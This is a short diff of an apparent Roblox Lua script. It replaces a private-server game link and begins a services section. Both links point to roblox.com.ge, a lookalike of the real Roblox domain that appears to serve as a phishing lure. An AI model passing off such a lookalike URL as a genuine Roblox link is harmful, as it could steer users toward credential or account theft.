@@ -1,5 +1,5 @@
 -- LINK
-local link = "https://roblox.com.ge/games/2753915549/Blox-Fruits?privateServerLinkCode=36163691925524676414808750559370"
+local link = "https://roblox.com.ge/games/109983668079237/DUELS-Steal-a-Brainrot?privateServerLinkCode=36163691925524676414808750559370"
 
 -- SERVICES
 local UIS = game:GetService("UserInputService")
